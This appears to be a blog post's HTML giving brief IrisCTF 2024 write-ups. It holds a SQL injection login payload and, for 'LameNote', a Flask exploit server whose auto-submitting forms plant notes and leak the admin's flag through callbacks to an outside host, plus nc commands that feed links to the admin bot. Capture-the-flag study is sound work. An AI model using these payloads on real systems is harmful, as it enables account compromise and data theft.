@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="What’s My Passwordsql injection 1&amp;#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username&#x3D;\&quot;skat\&quot;#&quot;&amp;#125;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IrisCTF">
+<meta property="og:url" content="https://chensonghi.github.io./2024/02/05/IrisCTF/index.html">
+<meta property="og:site_name" content="星河风">
+<meta property="og:description" content="What’s My Passwordsql injection 1&amp;#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username&#x3D;\&quot;skat\&quot;#&quot;&amp;#125;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-02-04T16:39:11.000Z">
+<meta property="article:modified_time" content="2024-02-04T16:40:44.542Z">
+<meta property="article:author" content="chleynx">
+<meta property="article:tag" content="2024">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://chensonghi.github.io./2024/02/05/IrisCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IrisCTF | 星河风</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">星河风</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/IrisCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IrisCTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-05 00:39:11 / 修改时间：00:40:44" itemprop="dateCreated datePublished" datetime="2024-02-05T00:39:11+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="What’s-My-Password"><a href="#What’s-My-Password" class="headerlink" title="What’s My Password"></a>What’s My Password</h2><p>sql injection</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username=\&quot;skat\&quot;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="LameNote"><a href="#LameNote" class="headerlink" title="LameNote"></a>LameNote</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Note challenges are lame so I made a lamer one. Flag matches irisctf&#123;[a-z_]+&#125;</span><br><span class="line"></span><br><span class="line">Admin will log in, make a note with the flag, then visit your link. (Sorry if the timeout is a bit broken on this challenge, there&#x27;s no PoW on the admin bot so feel free to spam it a bit)</span><br><span class="line"></span><br><span class="line">nc lamenote-adminbot.chal.irisc.tf 10300</span><br><span class="line"></span><br><span class="line">Hint!</span><br><span class="line">Please redownload if you downloaded server files at the start of the event.</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/e71696da-6929-44f6-843a-ade7f472026a/lamenote.tar.gz">lamenote.tar.gz</a></p>
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/d843f21b-391a-4c6a-9022-f34c2e512058/lamenote-adminbot.tar.gz">lamenote-adminbot.tar.gz</a></p>
+<p>maybe <a target="_blank" rel="noopener" href="https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks</a></p>
+<p>trying…</p>
+<p>there is always response 200, so seems like not this</p>
+<p>Got idea: In our resourse need make bot to create a new note with content <strong>irisctf{a</strong> and with img url to <strong>any webhook</strong>, then in iframe open the <em><strong>&#x2F;search?query&#x3D;irisctf{a</strong></em></p>
+<ul>
+<li>if there is only our note matches then server will open our note and request to our webhook</li>
+<li>if there is more than 1 note with “irisctf{a” then response will be just urls of notes, no request to webhook, so we can extract the symbol of flag</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, make_response, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> <span class="variable constant_">CORS</span></span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"><span class="title function_">CORS</span>(app)</span><br><span class="line">callbacks = []</span><br><span class="line">temp = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test2<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;</span>&lt;<span class="attr">https</span>:<span class="comment">//lamenote-web.chal.irisc.tf/create&gt;&quot; method=&quot;POST&quot; target=&quot;test&quot;&gt;</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Flag&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>edu<span class="symbol">&amp;#46;</span>ghost1032<span class="symbol">&amp;#46;</span>top/callback<span class="symbol">&amp;#63;</span>callback<span class="symbol">&amp;#61;</span>&#123;&#125;&amp;index=&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&lt;https://lamenote-web.chal.irisc.tf/search&gt;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;test2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">1</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@app.route(&#x27;/leak/&lt;i&gt;/&lt;string&gt;&#x27;)</span></span><br><span class="line"><span class="string">def index(i,string):</span></span><br><span class="line"><span class="string">    return make_response(temp.format(string, string, i , string))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/callback&#x27;)</span></span><br><span class="line"><span class="string">def cb():</span></span><br><span class="line"><span class="string">    cb = request.args.get(&#x27;callback&#x27;) </span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if len(callbacks) &lt;= index:</span></span><br><span class="line"><span class="string">        callbacks.append(&#123;&#125;)</span></span><br><span class="line"><span class="string">    if cb in callbacks[index]:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] += 1</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] = 1</span></span><br><span class="line"><span class="string">    print(callbacks)</span></span><br><span class="line"><span class="string">    return make_response(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/result&#x27;)</span></span><br><span class="line"><span class="string">def result():</span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if index &gt;= len(callbacks):</span></span><br><span class="line"><span class="string">        return make_response(&#x27;Nope&#x27;)</span></span><br><span class="line"><span class="string">    return make_response(str(callbacks[index]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.run(debug=True, port=48080)</span></span><br></pre></td></tr></table></figure>
+
+<p>example:</p>
+<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pz">https://edu.ghost1032.top/leak/0/pz</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 would have 2 callback requests</p>
+<p>while</p>
+<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pl">https://edu.ghost1032.top/leak/0/pl</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 only has 1 callback request.</p>
+<p>You should try a couple of times for every char, since <code>Sorry if the timeout is a bit broken on this challenge</code></p>
+<p>And that’s why I don’t have a working full-automatic exp :(</p>
+<p>Maybe we can solve the issue by making multiple tries for every char.</p>
+<p>I made some exploit, trying now …</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;please_no_more_unintended_bugs&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>chleynx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://chensonghi.github.io./2024/02/05/IrisCTF/" title="IrisCTF">https://chensonghi.github.io./2024/02/05/IrisCTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/2024/" rel="tag"># 2024</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/02/05/Insomni-hack/" rel="prev" title="Insomni'hack">
+      <i class="fa fa-chevron-left"></i> Insomni'hack
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/02/05/RW-be/" rel="next" title="RW-be">
+      RW-be <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#What%E2%80%99s-My-Password"><span class="nav-number">1.</span> <span class="nav-text">What’s My Password</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LameNote"><span class="nav-number">2.</span> <span class="nav-text">LameNote</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chleynx"
+      src="/images/ch.jpg">
+  <p class="site-author-name" itemprop="name">chleynx</p>
+  <div class="site-description" itemprop="description">不是看到希望才坚持，而是坚持了才能看到希望</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/c582037" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-10-8 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chleynx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
